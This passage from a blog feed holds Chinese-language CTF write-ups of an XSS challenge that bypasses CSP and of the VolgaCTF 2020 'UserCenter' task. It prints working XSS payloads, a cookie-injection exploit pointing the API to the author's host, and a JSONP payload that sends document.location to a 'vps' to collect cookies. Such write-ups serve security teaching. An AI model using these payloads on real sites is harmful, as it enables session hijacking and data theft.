class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码逻辑为：</p><p>通过触发location.hash的变化来调用displayReason函数，通过ajax请求得到./reasons/${reason}.txt，然后把response的内容返回给id为reason的标签。</p><p>首先测试了下直接在URL的锚部分写上xss语句</p><p><img src="https://s1.ax1x.com/2020/04/22/JtR4Zn.png" alt="JtR4Zn.png"></p><p>这里可以看到这个404的页面，在response时不仅对特殊字符进行了编码处理，而且还会将%替换为_，所以直接通过xss语句触发是没戏了。</p><p>接下来尝试了一下.htaccess等403页面的触发，看下对应的response内容有没有经过处理</p><p><img src="https://s1.ax1x.com/2020/04/22/JtfOER.png" alt="JtfOER.png"></p><p>可以看到，在403的response中我们的xss语句是完整存在的，那么接下来只需要把这个xss带到我们之前的页面就可以触发xss了</p><p>进行尝试</p><p>这里需要注意两个地方</p><ul><li>第一个是默认ajax去请求是下reasons文件夹下，我们如果要请求.htaccess是需要向上跳一级目录的</li><li>第二个是我们需要拿到的是访问htaccess得到的response，所以htaccess的参数需要进行二次编码</li></ul><p>最终访问效果如下：</p><p><img src="https://s1.ax1x.com/2020/04/22/JtIBZQ.png" alt="JtIBZQ.png"></p><p>可以看到img标签成功被解析。</p><p>不过此时仍然没法弹窗，因为这个challenge是有csp进行限制的,csp规则如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">default-src &#39;self&#39;;</span><br></pre></td></tr></table></figure><p>限制了资源必须来自此站点</p><p>那么接下来就开始寻找一些可以当成js来执行的地方，我们可以通过之前的404页面返回的内容来当作我们的js语句，并且通过script标签的src属性进行引入，唯一需要注意的是要进行单引号的闭合</p><p>构造语句如下：</p><p><a href="https://imgchr.com/i/JtbPAg" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/04/22/JtbPAg.png" alt="JtbPAg.png"></a></p><p>在控制台执行一下</p><p><img src="https://s1.ax1x.com/2020/04/22/JtbQN4.png" alt="JtbQN4.png"></p><p>成功触发，接下来把这个返回内容作为外部js引入就可以了</p><p>不过不能直接在response里面直接返回script标签，因为这里的赋值是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reason.innerHTML &#x3D; unescape(this.responseText);</span><br></pre></td></tr></table></figure><p>通过innterHTML产生的script标签并不可以执行</p><p>所以这里可以用iframe的srcdoc属性去解决这个问题，payload如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span>/<span class="attr">srcdoc</span>=<span class="string">'&lt;script src="x%27-alert(document.domain)-%27"&gt;&lt;/script&gt;'</span>&gt;</span></span><br></pre></td></tr></table></figure><p>将上面的payload二次编码后，放进location.hash</p><p>成功触发xss</p><p><img src="https://s1.ax1x.com/2020/04/22/JtvIGF.png" alt="JtvIGF.png"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;文章首发于先知&lt;/p&gt;
&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;国外的一个xss challenge(规定时间内做出可得一年的Burp Suite正版证书)&lt;/p&gt;
&lt;p&gt;&lt;
      
    
    </summary>
    
    
    
      <category term="XSS" scheme="http://yoursite.com/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>VolgaCTF 2020 Qualifier-Web</title>
    <link href="http://yoursite.com/2020/04/22/VolgaCTF-2020-Qualifier-Web/"/>
    <id>http://yoursite.com/2020/04/22/VolgaCTF-2020-Qualifier-Web/</id>
    <published>2020-04-22T09:35:57.000Z</published>
    <updated>2020-04-22T09:36:28.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="UserCenter"><a href="#UserCenter" class="headerlink" title="UserCenter"></a>UserCenter</h3><p>首先大概一下浏览基本功能</p><ul><li>登陆/注册</li><li>查看个人信息以及修改个人信息和头像</li><li>Report Bug将URL发送给admin进行xss</li></ul><p>大概测试了一下，发现如下：</p><p>修改个人信息的地方会进行html实体编码没法xss，头像处试过传了下svg，发现不太行，网站对type做了限制，限制了svg以及xml等文件的上传，并且它是把网站上传的图片放到static子域进行储存的。</p><p>不过发现我们可以通过控制type的类型来控制返回文件的类型. 我是通过<code>text/plain;,text/html</code>来进行bypass的，因为在Chrome中是支持以逗号分隔的多种内容类型的，所以可以利用这个来进行Bypass.</p><p><img src="https://s1.ax1x.com/2020/03/31/GQfQCF.png" alt="GQfQCF.png"></p><p>看了下国外大哥的wp,发现他fuzz出了更多可执行xss的Content-Type, tql..</p><p>详细可以看这篇文章</p><p><a href="https://blog.blackfan.ru/2020/03/volgactf-2020-qualifier-writeup.html" target="_blank" rel="noopener">https://blog.blackfan.ru/2020/03/volgactf-2020-qualifier-writeup.html</a></p><p>接下来可以看下主页面的main.js..(我刚开始没发现这个文件..)</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getUser</span>(<span class="params">guid</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (guid) &#123;</span><br><span class="line">        $.getJSON(<span class="string">`//<span class="subst">$&#123;api&#125;</span>.volgactf-task.ru/user?guid=<span class="subst">$&#123;guid&#125;</span>`</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">            data</span></span></span><br><span class="line"><span class="function"><span class="params">        </span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (!data.success) &#123;</span><br><span class="line">                location.replace(<span class="string">"/profile.html"</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                profile(data.user);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $.getJSON(<span class="string">`//<span class="subst">$&#123;api&#125;</span>.volgactf-task.ru/user`</span>, <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (!data.success) &#123;</span><br><span class="line">                location.replace(<span class="string">"/login.html"</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                profile(data.user, <span class="literal">true</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).fail(<span class="function"><span class="keyword">function</span>(<span class="params">jqxhr, textStatus, error</span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(jqxhr, textStatus, error);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">updateUser</span>(<span class="params">user</span>) </span>&#123;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        type: <span class="string">"POST"</span>,</span><br><span class="line">        url: <span class="string">`//<span class="subst">$&#123;api&#125;</span>.volgactf-task.ru/user-update`</span>,</span><br><span class="line">        data: <span class="built_in">JSON</span>.stringify(user),</span><br><span class="line">        contentType: <span class="string">"application/json"</span>,</span><br><span class="line">        dataType: <span class="string">"json"</span></span><br><span class="line">    &#125;).done(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!data.success) &#123;</span><br><span class="line">            showError(data.error);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            location.replace(<span class="string">`/profile.html`</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">logout</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $.<span class="keyword">get</span>(`//$&#123;api&#125;.volgactf-task.ru/logout<span class="string">`, function(data) &#123;</span></span><br><span class="line"><span class="string">        location.replace("/login.html");</span></span><br><span class="line"><span class="string">    &#125;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">function profile(user, edit) &#123;</span></span><br><span class="line"><span class="string">    if (</span></span><br><span class="line"><span class="string">        !["/profile.html", "/report.php", "/editprofile.html"].includes(</span></span><br><span class="line"><span class="string">            location.pathname</span></span><br><span class="line"><span class="string">        )</span></span><br><span class="line"><span class="string">    )</span></span><br><span class="line"><span class="string">        location.replace("/profile.html");</span></span><br><span class="line"><span class="string">    $("#username").text(user.username);</span></span><br><span class="line"><span class="string">    $("#username").val(user.username);</span></span><br><span class="line"><span class="string">    $("#bio").text(user.bio);</span></span><br><span class="line"><span class="string">    $("#bio").val(user.bio);</span></span><br><span class="line"><span class="string">    $("#avatar").attr("src", `</span><span class="comment">//static.volgactf-task.ru/$&#123;user.avatar&#125;`);</span></span><br><span class="line">    <span class="keyword">if</span> (edit) &#123;</span><br><span class="line">        $(<span class="string">"#editProfile"</span>).removeClass(<span class="string">"d-none"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $(<span class="string">'.nav-item .nav-link[href="/login.html"]'</span>).addClass(<span class="string">"d-none"</span>);</span><br><span class="line">    $(<span class="string">'.nav-item .nav-link[href="/register.html"]'</span>).addClass(<span class="string">"d-none"</span>);</span><br><span class="line">    $(<span class="string">'.nav-item .nav-link[href="/profile.html"]'</span>).removeClass(<span class="string">"d-none"</span>);</span><br><span class="line">    $(<span class="string">'.nav-item .nav-link[href="/logout.html"]'</span>).removeClass(<span class="string">"d-none"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">replaceForbiden</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str</span><br><span class="line">        .replace(<span class="regexp">/[ !"#$%&amp;Вґ()*+,\-\/:;&lt;=&gt;?@\[\\\]^_`&#123;|&#125;~]/g</span>, <span class="string">""</span>)</span><br><span class="line">        .replace(<span class="regexp">/[^\x00-\x7F]/g</span>, <span class="string">"?"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showError</span>(<span class="params">error</span>) </span>&#123;</span><br><span class="line">    $(<span class="string">"#error"</span>)</span><br><span class="line">        .removeClass(<span class="string">"d-none"</span>)</span><br><span class="line">        .text(error);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    api = <span class="string">"api"</span>;</span><br><span class="line">    <span class="keyword">if</span> (Cookies.get(<span class="string">"api_server"</span>)) &#123;</span><br><span class="line">        api = replaceForbiden(Cookies.get(<span class="string">"api_server"</span>));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        Cookies.set(<span class="string">"api_server"</span>, api, &#123; <span class="attr">secure</span>: <span class="literal">true</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $.ajaxSetup(&#123;</span><br><span class="line">        xhrFields: &#123;</span><br><span class="line">            withCredentials: <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    $(<span class="string">"#logForm"</span>).submit(<span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">        event.preventDefault();</span><br><span class="line">        $.ajax(&#123;</span><br><span class="line">            type: <span class="string">"POST"</span>,</span><br><span class="line">            url: <span class="string">`//<span class="subst">$&#123;api&#125;</span>.volgactf-task.ru/login`</span>,</span><br><span class="line">            data: <span class="built_in">JSON</span>.stringify(&#123;</span><br><span class="line">                username: $(<span class="string">"#username"</span>).val(),</span><br><span class="line">                password: $(<span class="string">"#password"</span>).val()</span><br><span class="line">            &#125;),</span><br><span class="line">            contentType: <span class="string">"application/json"</span>,</span><br><span class="line">            dataType: <span class="string">"json"</span></span><br><span class="line">        &#125;).done(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (!data.success) &#123;</span><br><span class="line">                showError(data.error);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                location.replace(<span class="string">`/profile.html?guid=<span class="subst">$&#123;data.guid&#125;</span>`</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    $(<span class="string">"#regForm"</span>).submit(<span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">        event.preventDefault();</span><br><span class="line">        $.ajax(&#123;</span><br><span class="line">            type: <span class="string">"POST"</span>,</span><br><span class="line">            url: <span class="string">`//<span class="subst">$&#123;api&#125;</span>.volgactf-task.ru/register`</span>,</span><br><span class="line">            data: <span class="built_in">JSON</span>.stringify(&#123;</span><br><span class="line">                username: $(<span class="string">"#username"</span>).val(),</span><br><span class="line">                password: $(<span class="string">"#password"</span>).val()</span><br><span class="line">            &#125;),</span><br><span class="line">            contentType: <span class="string">"application/json"</span>,</span><br><span class="line">            dataType: <span class="string">"json"</span></span><br><span class="line">        &#125;).done(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (!data.success) &#123;</span><br><span class="line">                showError(data.error);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                location.replace(<span class="string">`/profile.html`</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    $(<span class="string">"#avatar"</span>).on(<span class="string">"change"</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $(<span class="keyword">this</span>)</span><br><span class="line">            .next(<span class="string">".custom-file-label"</span>)</span><br><span class="line">            .text($(<span class="keyword">this</span>).prop(<span class="string">"files"</span>)[<span class="number">0</span>].name);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    $(<span class="string">"#editForm"</span>).submit(<span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">        event.preventDefault();</span><br><span class="line">        b64Avatar = <span class="string">""</span>;</span><br><span class="line">        mime = <span class="string">""</span>;</span><br><span class="line">        bio = $(<span class="string">"#bio"</span>).val();</span><br><span class="line">        avatar = $(<span class="string">"#avatar"</span>).prop(<span class="string">"files"</span>)[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span> (avatar) &#123;</span><br><span class="line">            reader = <span class="keyword">new</span> FileReader();</span><br><span class="line">            reader.readAsDataURL(avatar);</span><br><span class="line">            reader.onload = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">                b64Avatar = reader.result.split(<span class="string">","</span>)[<span class="number">1</span>];</span><br><span class="line">                mime = avatar.type;</span><br><span class="line">                updateUser(&#123; <span class="attr">avatar</span>: b64Avatar, <span class="attr">type</span>: mime, <span class="attr">bio</span>: bio &#125;);</span><br><span class="line">            &#125;;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            updateUser(&#123; <span class="attr">bio</span>: bio &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    params = <span class="keyword">new</span> URLSearchParams(location.search);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">        [</span><br><span class="line">            <span class="string">"/"</span>,</span><br><span class="line">            <span class="string">"/index.html"</span>,</span><br><span class="line">            <span class="string">"/profile.html"</span>,</span><br><span class="line">            <span class="string">"/report.php"</span>,</span><br><span class="line">            <span class="string">"/editprofile.html"</span></span><br><span class="line">        ].includes(location.pathname)</span><br><span class="line">    ) &#123;</span><br><span class="line">        getUser(params.get(<span class="string">"guid"</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ([<span class="string">"/logout.html"</span>].includes(location.pathname)) &#123;</span><br><span class="line">        logout();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>漏洞点：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    api = <span class="string">"api"</span>;</span><br><span class="line">    <span class="keyword">if</span> (Cookies.get(<span class="string">"api_server"</span>)) &#123;</span><br><span class="line">        api = replaceForbiden(Cookies.get(<span class="string">"api_server"</span>));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        Cookies.set(<span class="string">"api_server"</span>, api, &#123; <span class="attr">secure</span>: <span class="literal">true</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $.ajaxSetup(&#123;</span><br><span class="line">        xhrFields: &#123;</span><br><span class="line">            withCredentials: <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"> <span class="comment">//   </span></span><br><span class="line">    </span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">getUser</span>(<span class="params">guid</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (guid) &#123;</span><br><span class="line">        $.getJSON(<span class="string">`//<span class="subst">$&#123;api&#125;</span>.volgactf-task.ru/user?guid=<span class="subst">$&#123;guid&#125;</span>`</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">            data</span></span></span><br><span class="line"><span class="function"><span class="params">        </span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (!data.success) &#123;</span><br><span class="line">                location.replace(<span class="string">"/profile.html"</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                profile(data.user);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $.getJSON(<span class="string">`//<span class="subst">$&#123;api&#125;</span>.volgactf-task.ru/user`</span>, <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (!data.success) &#123;</span><br><span class="line">                location.replace(<span class="string">"/login.html"</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                profile(data.user, <span class="literal">true</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).fail(<span class="function"><span class="keyword">function</span>(<span class="params">jqxhr, textStatus, error</span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(jqxhr, textStatus, error);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在一段代码中我们可以看出来api变量的赋值时通过cookie进行的，在第二段getUser函数中子域名是通过api变量去确认的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$.getJSON(&#96;&#x2F;&#x2F;$&#123;api&#125;.volgactf-task.ru&#x2F;user?guid&#x3D;$&#123;guid&#125;...</span><br></pre></td></tr></table></figure><p>但是在可控制api变量的情况下我们实际上是可以控制请求的网址的。比如另api为exploit.lihuaiqiu.top?，那么实际请求的URL为<a href="https://exploit.lihuaiqiu.top?.volgactf-task.ru/user?guid=${guid}" target="_blank" rel="noopener">https://exploit.lihuaiqiu.top?.volgactf-task.ru/user?guid=${guid}</a> 即可控制请求的网址，但是在main.js有这样一个过滤函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function replaceForbiden(str) &#123;</span><br><span class="line">    return str</span><br><span class="line">        .replace(&#x2F;[ !&quot;#$%&amp;Вґ()*+,\-\&#x2F;:;&lt;&#x3D;&gt;?@\[\\\]^_&#96;&#123;|&#125;~]&#x2F;g, &quot;&quot;)</span><br><span class="line">        .replace(&#x2F;[^\x00-\x7F]&#x2F;g, &quot;?&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里对?进行替空 并且对\x00-\x7F换成?..所以直接用\x00-\x7F间的字符bypass一下就可以了</p><p>最后我们需要通过getJSON函数来触发xss.简单的看一下介绍：</p><p><img src="https://s1.ax1x.com/2020/03/31/GQfyDI.png" alt="GQfyDI.png"></p><p>本地简单试一下</p><p>在我们的网站放入xss语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&#123;&quot;xss&quot;:alert(1)&#125;);</span><br></pre></td></tr></table></figure><p>调用getJSON函数，成功触发xss</p><p><img src="https://s1.ax1x.com/2020/03/31/GQhIJO.png" alt="GQhIJO.png"></p><p>所以这里我们只需要将参数控制为?即可xss，回到之前的代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$.getJSON(<span class="string">`//<span class="subst">$&#123;api&#125;</span>.volgactf-task.ru/user?guid=<span class="subst">$&#123;guid&#125;</span>`</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">    data</span></span></span><br><span class="line"><span class="function"><span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!data.success) &#123;</span><br><span class="line">        location.replace(<span class="string">"/profile.html"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        profile(data.user);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="keyword">if</span> (</span><br><span class="line">    [</span><br><span class="line">        <span class="string">"/"</span>,</span><br><span class="line">        <span class="string">"/index.html"</span>,</span><br><span class="line">        <span class="string">"/profile.html"</span>,</span><br><span class="line">        <span class="string">"/report.php"</span>,</span><br><span class="line">        <span class="string">"/editprofile.html"</span></span><br><span class="line">    ].includes(location.pathname)</span><br><span class="line">) &#123;</span><br><span class="line">    getUser(params.get(<span class="string">"guid"</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过上面代码 可分析得在path有上面数组中的任意一个，将传第guid参数给getUser，那我们只要给guid一个?就可以了</p><p>最终exp</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.cookie = <span class="string">"api_server=exploit.lihuaiqiu.top\x77; domain=volgactf-task.ru;"</span>;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.location = <span class="string">'https://volgactf-task.ru/report.php?guid=?'</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在<a href="https://exploit.lihuaiqiu.top放上构造好的xss语句" target="_blank" rel="noopener">https://exploit.lihuaiqiu.top放上构造好的xss语句</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&#123;<span class="string">"test"</span>:<span class="built_in">window</span>.location=<span class="string">'vps'</span>+<span class="built_in">document</span>.location&#125;);</span><br></pre></td></tr></table></figure><p>自己vps监听下即可收到cookie</p><p><img src="https://s1.ax1x.com/2020/03/31/Gl8ggJ.png" alt="Gl8ggJ.png"></p><p>当然还有另一种更有趣的回调操作</p><p>俄罗斯带哥找到了回溯的正则表达，膜，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;  1.7.2 &#x2F;(&#x3D;)\?(?&#x3D;&amp;|$)|\?\?&#x2F;</span><br><span class="line">&lt;&#x3D; 1.7.2 